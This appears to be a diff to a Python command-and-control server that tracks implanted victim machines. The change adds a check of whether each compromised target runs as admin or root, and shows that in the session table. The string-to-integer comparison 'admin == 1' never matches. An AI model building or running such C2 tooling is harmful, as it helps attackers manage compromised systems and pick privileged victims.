@@ -23,6 +23,13 @@ def comm_handler():
             remote_target, remote_ip = sock.accept()
             # receive username from winplant.py
             username = remote_target.recv(1024).decode()
+            admin = remote_target.recv(1024).decode()
+            if admin == 1:
+                admin_val = 'Yes'
+            elif admin == 'root':
+                admin_val = 'Yes'
+            else:
+                admin_val = 'No'
             cur_time = time.strftime("%H:%M:%S", time.localtime())
             date = datetime.now()
             time_record = (f"{date.month}/{date.day}/{date.year} {cur_time}")
@@ -99,10 +106,10 @@ if __name__ == "__main__":
                 session_counter = 0
                 if command.split(" ")[1] == "-l":
                     myTable = PrettyTable()
-                    myTable.field_names = ["Session", "Status", "Username", "Target", "Check-In Time"]
+                    myTable.field_names = ["Session", "Status", "Username", "Admin", "Target", "Check-In Time"]
                     myTable.padding_width = 3
                     for target in targets:
-                        myTable.add_row([session_counter, "Placeholder", target[3], target[1], target[2]])
+                        myTable.add_row([session_counter, "Placeholder", target[3], target[4], target[1], target[2]])
                         session_counter += 1
                     print(myTable)
                 if command.split(" ")[1] == "-i":
